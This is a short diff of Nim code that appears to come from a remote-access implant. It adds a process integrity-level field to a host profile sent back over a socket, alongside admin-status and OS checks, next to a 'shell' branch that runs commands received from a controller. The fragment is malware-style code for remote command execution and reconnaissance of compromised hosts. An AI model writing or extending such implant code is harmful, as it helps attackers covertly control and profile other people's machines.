@@ -39,7 +39,8 @@ proc receiveCommands(client: Socket) =
         isAdmin=areWeAdmin(),
         osType=osType,
         windowsVersionInfo=getwindowosinfo(),
-        linuxVersionInfo=getlinuxosinfo()
+        linuxVersionInfo=getlinuxosinfo(),
+        ownIntegrity=getintegrity()
       )
     of "shell": 
       let toExec = jsonNode["data"]["shellCmd"].getStr()
